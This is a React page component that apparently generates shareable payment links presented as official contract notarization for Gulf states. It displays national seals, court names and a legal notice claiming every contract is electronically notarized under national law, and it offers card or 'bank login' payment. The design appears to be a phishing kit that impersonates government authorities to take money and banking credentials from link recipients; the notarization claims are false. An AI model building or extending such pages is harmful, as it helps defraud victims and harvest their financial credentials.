import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { getCountryByCode } from "@/lib/countries";
import { ArrowRight, FileText, Scale, RefreshCw, DollarSign, Download, Eye, Stamp, PenTool, CreditCard, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import { formatCurrency, getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Copy, ExternalLink } from "lucide-react";

interface ContractTemplate {
  id: string;
  name: string;
  nameEn: string;
  category: string;
  fields: Array<{
    label: string;
    labelEn: string;
    type: "text" | "number" | "date" | "textarea";
    required: boolean;
  }>;
  legalRequirements: string[];
  signatureFields: string[];
}

const Contracts = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const selectedCountry = getCountryByCode(country || "SA");
  const createLink = useCreateLink();

  const [selectedTemplate, setSelectedTemplate] = useState<string>("");
  const [contractData, setContractData] = useState<Record<string, string>>({});
  const [paymentMethod, setPaymentMethod] = useState<string>("card");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [createdLink, setCreatedLink] = useState("");

  const contractTemplates: ContractTemplate[] = [
    {
      id: "service_agreement",
      name: "عقد اتفاق خدمة",
      nameEn: "Service Agreement Contract",
      category: "خدمات",
      fields: [
        { label: "اسم العميل", labelEn: "Client Name", type: "text", required: true },
        { label: "اسم الشركة المزودة", labelEn: "Service Provider Name", type: "text", required: true },
        { label: "وصف الخدمة", labelEn: "Service Description", type: "textarea", required: true },
        { label: "مدة العقد", labelEn: "Contract Duration", type: "text", required: true },
        { label: "قيمة العقد", labelEn: "Contract Value", type: "number", required: true },
        { label: "تاريخ البداية", labelEn: "Start Date", type: "date", required: true },
        { label: "تاريخ النهاية", labelEn: "End Date", type: "date", required: true },
      ],
      legalRequirements: [
        "يجب توثيق العقد في الشهر العقاري",
        "يلزم ختم الغرفة التجارية",
        "توقيعان من الطرفين",
      ],
      signatureFields: ["clientSignature", "providerSignature", "witnessSignature"],
    },
    {
      id: "employment_contract",
      name: "عقد عمل موظف",
      nameEn: "Employment Contract",
      category: "توظيف",
      fields: [
        { label: "اسم الموظف", labelEn: "Employee Name", type: "text", required: true },
        { label: "رقم الهوية", labelEn: "ID Number", type: "text", required: true },
        { label: "المنصب الوظيفي", labelEn: "Job Position", type: "text", required: true },
        { label: "اسم صاحب العمل", labelEn: "Employer Name", type: "text", required: true },
        { label: "الراتب الشهري", labelEn: "Monthly Salary", type: "number", required: true },
        { label: "تاريخ بداية العمل", labelEn: "Start Date", type: "date", required: true },
        { label: "مدة التجربة", labelEn: "Probation Period", type: "text", required: true },
      ],
      legalRequirements: [
        "توثيق في وزارة العمل",
        "ختم المؤسسة",
        "توقيع ثلاثة أطراف",
      ],
      signatureFields: ["employeeSignature", "employerSignature", "hrSignature"],
    },
    {
      id: "sale_purchase",
      name: "عقد بيع وشراء",
      nameEn: "Sale and Purchase Agreement",
      category: "بيع",
      fields: [
        { label: "اسم البائع", labelEn: "Seller Name", type: "text", required: true },
        { label: "اسم المشتري", labelEn: "Buyer Name", type: "text", required: true },
        { label: "وصف المنتج", labelEn: "Product Description", type: "textarea", required: true },
        { label: "سعر البيع", labelEn: "Sale Price", type: "number", required: true },
        { label: "تاريخ البيع", labelEn: "Sale Date", type: "date", required: true },
        { label: "طريقة الدفع", labelEn: "Payment Method", type: "text", required: true },
      ],
      legalRequirements: [
        "توثيق في المحكمة",
        "ختم البلدية",
        "توقيع شاهد",
      ],
      signatureFields: ["sellerSignature", "buyerSignature", "witness1Signature", "witness2Signature"],
    },
    {
      id: "lease_agreement",
      name: "عقد إيجار عقار",
      nameEn: "Property Lease Agreement",
      category: "عقارات",
      fields: [
        { label: "اسم المالك", labelEn: "Owner Name", type: "text", required: true },
        { label: "اسم المستأجر", labelEn: "Tenant Name", type: "text", required: true },
        { label: "وصف العقار", labelEn: "Property Description", type: "textarea", required: true },
        { label: "عنوان العقار", labelEn: "Property Address", type: "textarea", required: true },
        { label: "قيمة الإيجار الشهري", labelEn: "Monthly Rent", type: "number", required: true },
        { label: "فترة الإيجار", labelEn: "Lease Period", type: "text", required: true },
        { label: "تاريخ بداية الإيجار", labelEn: "Start Date", type: "date", required: true },
      ],
      legalRequirements: [
        "توثيق في محكمة الأحوال الشخصية",
        "ختم مكتب الاستشارات القانونية",
        "توقيع شاهدين",
      ],
      signatureFields: ["ownerSignature", "tenantSignature", "witness1Signature", "witness2Signature"],
    },
    {
      id: "consulting_contract",
      name: "عقد استشارات",
      nameEn: "Consulting Contract",
      category: "استشارات",
      fields: [
        { label: "اسم العميل", labelEn: "Client Name", type: "text", required: true },
        { label: "اسم المستشار", labelEn: "Consultant Name", type: "text", required: true },
        { label: "نوع الاستشارة", labelEn: "Consultation Type", type: "text", required: true },
        { label: "تفاصيل المشروع", labelEn: "Project Details", type: "textarea", required: true },
        { label: "قيمة الأتعاب", labelEn: "Consultation Fees", type: "number", required: true },
        { label: "تاريخ البداية", labelEn: "Start Date", type: "date", required: true },
      ],
      legalRequirements: [
        "توثيق في غرفة المحامين",
        "ختم المؤسسة الاستشارية",
        "توقيع معتمد",
      ],
      signatureFields: ["clientSignature", "consultantSignature", "witnessSignature"],
    },
  ];

  const getCountrySpecificElements = (countryCode: string) => {
    const elements = {
      SA: { logo: "🇸🇦", seal: "المملكة العربية السعودية", legalText: " وفقاً لنظام المرافعات الشرعية والأنظمة ذات الصلة في المملكة العربية السعودية", authority: "المحكمة العامة", stampPosition: "bottom-left", signaturePosition: "bottom-right", color: "#006747" },
      AE: { logo: "🇦🇪", seal: "دولة الإمارات العربية المتحدة", legalText: " وفقاً لقانون المعاملات المدنية والتجارية لدولة الإمارات العربية المتحدة", authority: "محاكم دبي", stampPosition: "bottom-left", signaturePosition: "bottom-right", color: "#C8102E" },
      KW: { logo: "🇰🇼", seal: "دولة الكويت", legalText: " وفقاً لقانون المرافعات التجارية والتجارية لدولة الكويت", authority: "محاكم الكويت", stampPosition: "bottom-left", signaturePosition: "bottom-right", color: "#006B3E" },
      QA: { logo: "🇶🇦", seal: "دولة قطر", legalText: " وفقاً لقانون المرافعات المدنية والتجارية لدولة قطر", authority: "محاكم قطر", stampPosition: "bottom-left", signaturePosition: "bottom-right", color: "#4D0F28" },
      BH: { logo: "🇧🇭", seal: "مملكة البحرين", legalText: " وفقاً لقانون المرافعات المدنية والتجارية لمملكة البحرين", authority: "محاكم البحرين", stampPosition: "bottom-left", signaturePosition: "bottom-right", color: "#D0103A" },
      OM: { logo: "🇴🇲", seal: "سلطنة عُمان", legalText: " وفقاً لقانون المرافعات المدنية والتجارية لسلطنة عُمان", authority: "محاكم سلطنة عُمان", stampPosition: "bottom-left", signaturePosition: "bottom-right", color: "#D0103A" },
    };
    return elements[countryCode as keyof typeof elements] || elements.SA;
  };

  const handleTemplateSelect = (templateId: string) => {
    setSelectedTemplate(templateId);
    setContractData({});
  };

  const handleFieldChange = (fieldName: string, value: string) => {
    setContractData({ ...contractData, [fieldName]: value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const template = contractTemplates.find((t) => t.id === selectedTemplate);
    if (!template) return;

    const missingFields = template.fields.filter((field) => field.required && !contractData[field.labelEn]);
    if (missingFields.length > 0) {
      toast({ title: "خطأ في البيانات", description: `يرجى ملء جميع الحقول المطلوبة: ${missingFields.map((f) => f.label).join(", ")}`, variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const amount = parseFloat(contractData["Contract Value"] || contractData["Monthly Salary"] || contractData["Sale Price"] || contractData["Monthly Rent"] || contractData["Consultation Fees"] || "1000");

    const contractPayload = {
      template_id: selectedTemplate,
      template_name: template.name,
      template_name_en: template.nameEn,
      template_category: template.category,
      fields: template.fields,
      contract_data: contractData,
      legal_requirements: template.legalRequirements,
      signature_fields: template.signatureFields,
      country_elements: getCountrySpecificElements(country || "SA"),
      service_type: 'contracts',
      cod_amount: amount,
      currency_code: getCurrencyCode(country || "SA"),
      payment_method: paymentMethod,
      service_name: template.name
    };

    try {
      const link = await createLink.mutateAsync({ type: "contracts", country_code: country || "SA", payload: contractPayload });
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: 'contracts',
        country: country || 'SA',
        amount: amount,
        currency: getCurrencyCode(country || 'SA'),
        paymentMethod: paymentMethod,
        type: 'contracts'
      });
      setCreatedLink(paymentUrl);
      setShowSuccess(true);
      toast({ title: "تم إنشاء العقد بنجاح!" });
    } catch (error) {
      toast({ title: "خطأ في إنشاء العقد", description: "حدث خطأ أثناء إنشاء العقد. الرجاء المحاولة مرة أخرى", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!selectedCountry) return <div className="min-h-screen flex items-center justify-center"><p>دولة غير صحيحة</p></div>;

  const countryElements = getCountrySpecificElements(selectedCountry.code);

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Official Header */}
      <header className="bg-white border-b-4 h-20 flex items-center shadow-sm sticky top-0 z-50 px-4" style={{ borderBottomColor: countryElements.color }}>
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-4">
            <div className="text-4xl">{countryElements.logo}</div>
            <div>
              <h1 className="text-lg font-black leading-tight text-gray-800">{countryElements.seal}</h1>
              <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{countryElements.authority}</p>
            </div>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-5xl">
        <div className="flex items-center gap-4 mb-8">
          <div className="w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg" style={{ background: `linear-gradient(135deg, ${countryElements.color}, ${countryElements.color}dd)` }}>
            <Scale className="w-8 h-8 text-white" />
          </div>
          <div>
            <h2 className="text-2xl font-black text-gray-900">إدارة وتوثيق العقود الإلكترونية</h2>
            <p className="text-sm font-bold text-gray-500">نظام التوثيق الموحد - {selectedCountry.nameAr}</p>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            {!selectedTemplate ? (
              <Card className="p-8 border-2 rounded-3xl shadow-xl overflow-hidden relative">
                <div className="absolute top-0 right-0 w-32 h-32 bg-gray-50 rounded-full -mr-16 -mt-16 opacity-50" />
                <h3 className="text-xl font-black mb-6 flex items-center gap-2">
                  <FileText className="w-6 h-6 text-gray-400" />
                  اختر نموذج العقد
                </h3>
                <div className="grid md:grid-cols-2 gap-4">
                  {contractTemplates.map((template) => (
                    <button
                      key={template.id}
                      onClick={() => handleTemplateSelect(template.id)}
                      className="group p-5 rounded-2xl border-2 border-gray-100 bg-white hover:border-blue-500 hover:shadow-xl transition-all text-right relative overflow-hidden"
                    >
                      <div className="absolute top-0 right-0 w-1 h-full bg-blue-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      <div className="flex items-center gap-3 mb-3">
                        <div className="w-10 h-10 rounded-xl bg-blue-50 flex items-center justify-center group-hover:bg-blue-500 transition-colors">
                          <FileText className="w-5 h-5 text-blue-500 group-hover:text-white" />
                        </div>
                        <div>
                          <h4 className="font-black text-gray-800">{template.name}</h4>
                          <p className="text-[10px] font-bold text-gray-400 uppercase">{template.nameEn}</p>
                        </div>
                      </div>
                      <Badge variant="secondary" className="bg-gray-100 text-gray-500 font-bold px-3 py-1 rounded-lg">
                        {template.category}
                      </Badge>
                    </button>
                  ))}
                </div>
              </Card>
            ) : (
              <form onSubmit={handleSubmit} className="space-y-6">
                <Card className="p-8 border-2 rounded-3xl shadow-xl relative overflow-hidden">
                   <div className="absolute top-0 left-0 w-full h-2" style={{ backgroundColor: countryElements.color }} />
                   <div className="flex items-center justify-between mb-8">
                      <div>
                        <h3 className="text-2xl font-black text-gray-800">{contractTemplates.find(t => t.id === selectedTemplate)?.name}</h3>
                        <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{contractTemplates.find(t => t.id === selectedTemplate)?.nameEn}</p>
                      </div>
                      <Button type="button" variant="ghost" onClick={() => setSelectedTemplate("")} className="font-bold text-blue-600 hover:bg-blue-50 rounded-xl">
                        تغيير النموذج
                      </Button>
                   </div>

                   <div className="grid md:grid-cols-2 gap-6">
                      {contractTemplates.find(t => t.id === selectedTemplate)?.fields.map((field) => (
                        <div key={field.labelEn} className={field.type === "textarea" ? "md:col-span-2 space-y-2" : "space-y-2"}>
                          <Label className="text-[11px] font-black text-gray-400 uppercase px-1">{field.label} {field.required && <span className="text-red-500">*</span>}</Label>
                          <div className="relative group">
                            {field.type === "textarea" ? (
                              <Textarea
                                value={contractData[field.labelEn] || ""}
                                onChange={(e) => handleFieldChange(field.labelEn, e.target.value)}
                                required={field.required}
                                className="min-h-[120px] border-2 rounded-2xl focus:ring-0 focus:border-blue-500 bg-gray-50/50 p-4 font-bold text-gray-800"
                                placeholder={`أدخل ${field.label}...`}
                              />
                            ) : (
                              <div className="relative">
                                <Input
                                  type={field.type}
                                  value={contractData[field.labelEn] || ""}
                                  onChange={(e) => handleFieldChange(field.labelEn, e.target.value)}
                                  required={field.required}
                                  className="h-14 border-2 rounded-2xl focus:ring-0 focus:border-blue-500 bg-gray-50/50 px-4 font-bold text-gray-800"
                                />
                                {field.type === "number" && (
                                  <div className="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-1">
                                    <DollarSign className="w-4 h-4 text-gray-300" />
                                    <span className="text-[10px] font-black text-gray-300">{getCurrencySymbol(country || "SA")}</span>
                                  </div>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                      ))}
                   </div>
                </Card>

                <Card className="p-8 border-2 rounded-3xl shadow-xl relative overflow-hidden">
                   <h3 className="text-xl font-black text-gray-800 mb-6">طريقة السداد المتاحة في الرابط</h3>
                   <div className="grid grid-cols-2 gap-4">
                      <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-2xl border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-blue-500 bg-blue-50/50' : 'border-gray-50 bg-gray-50'}`}>
                        <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-blue-500' : 'text-gray-300'}`} />
                        <span className={`text-sm font-black ${paymentMethod === 'card' ? 'text-blue-600' : 'text-gray-400'}`}>بطاقة دفع</span>
                      </button>
                      <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-2xl border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-blue-500 bg-blue-50/50' : 'border-gray-50 bg-gray-50'}`}>
                        <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-blue-500' : 'text-gray-300'}`} />
                        <span className={`text-sm font-black ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-gray-400'}`}>دخول بنكي</span>
                      </button>
                   </div>
                </Card>

                <div className="flex gap-4">
                  <Button type="submit" disabled={isSubmitting} className="flex-1 h-16 rounded-2xl font-black text-lg shadow-lg hover:translate-y-[-2px] transition-all bg-gray-900 hover:bg-black text-white">
                    {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : (
                      <>
                        <Eye className="w-5 h-5 ml-2" />
                        إصدار العقد والتوثيق
                      </>
                    )}
                  </Button>
                  <Button type="button" variant="outline" className="h-16 px-8 rounded-2xl border-2 font-black text-gray-500 hover:bg-white hover:border-gray-300">
                    <Download className="w-5 h-5" />
                  </Button>
                </div>
              </form>
            )}
          </div>

          <aside className="space-y-6">
            <Card className="p-6 border-2 rounded-3xl shadow-lg text-center">
              <div className="w-20 h-20 bg-gray-50 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-gray-100">
                <Stamp className="w-10 h-10 text-gray-300" />
              </div>
              <h4 className="font-black text-gray-800 mb-2">جهة التوثيق</h4>
              <p className="text-2xl font-black" style={{ color: countryElements.color }}>{countryElements.seal}</p>
              <div className="mt-6 pt-6 border-t space-y-4">
                <div className="flex justify-between text-xs">
                  <span className="font-bold text-gray-400 uppercase">السلطة المختصة</span>
                  <span className="font-black text-gray-700">{countryElements.authority}</span>
                </div>
                <div className="flex justify-between text-xs">
                  <span className="font-bold text-gray-400 uppercase">القانون المطبق</span>
                  <span className="font-black text-gray-700 text-left mr-4">{selectedCountry.nameAr}</span>
                </div>
              </div>
            </Card>

            <Card className="p-6 border-2 rounded-3xl shadow-lg">
               <h4 className="font-black text-gray-800 mb-4 flex items-center gap-2">
                 <PenTool className="w-4 h-4 text-blue-500" />
                 حقول التوقيع المعتمدة
               </h4>
               {selectedTemplate ? (
                 <div className="space-y-3">
                   {contractTemplates.find(t => t.id === selectedTemplate)?.signatureFields.map((field, idx) => (
                     <div key={idx} className="flex items-center gap-3 p-3 rounded-xl bg-gray-50 border border-gray-100">
                        <div className="w-2 h-2 rounded-full bg-blue-500" />
                        <span className="text-sm font-bold text-gray-700">
                          {field.includes("client") && "توقيع العميل"}
                          {field.includes("provider") && "توقيع المزود"}
                          {field.includes("witness") && "توقيع الشاهد"}
                          {field.includes("employer") && "توقيع صاحب العمل"}
                          {field.includes("employee") && "توقيع الموظف"}
                          {field.includes("seller") && "توقيع البائع"}
                          {field.includes("buyer") && "توقيع المشتري"}
                          {field.includes("owner") && "توقيع المالك"}
                          {field.includes("tenant") && "توقيع المستأجر"}
                          {field.includes("consultant") && "توقيع المستشار"}
                          {field.includes("hr") && "توقيع الموارد البشرية"}
                        </span>
                     </div>
                   ))}
                 </div>
               ) : <p className="text-xs font-bold text-gray-400 text-center py-4">اختر نموذج العقد لعرض حقول التوقيع</p>}
            </Card>

            <div className="p-6 rounded-3xl bg-amber-50 border-2 border-amber-100 text-amber-800">
              <h5 className="font-black mb-2 flex items-center gap-2">
                <Scale className="w-4 h-4" />
                تنبيه قانوني
              </h5>
              <p className="text-[11px] font-bold leading-relaxed">
                جميع العقود المنشأة عبر هذا النظام موثقة إلكترونياً وتخضع لأنظمة التعاملات الإلكترونية في {selectedCountry.nameAr}.
              </p>
            </div>
          </aside>
        </div>
      </main>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-8 text-center space-y-6">
              <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-2" style={{ background: `${countryElements.color}15` }}>
                <div className="w-12 h-12 rounded-full flex items-center justify-center animate-bounce" style={{ background: countryElements.color }}>
                  <RefreshCw className="w-6 h-6 text-white" />
                </div>
              </div>
              <div>
                <AlertDialogTitle className="text-2xl font-black text-gray-900">العقد جاهز للمشاركة!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط دفع وتوثيق آمن لهذا العقد</AlertDialogDescription>
              </div>

              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
                {createdLink}
              </div>

              <div className="flex gap-3">
                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
                   <Copy className="w-4 h-4" /> نسخ الرابط
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
                   <ExternalLink className="w-4 h-4" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-24" />
      <BottomNav />
    </div>
  );
};

export default Contracts;
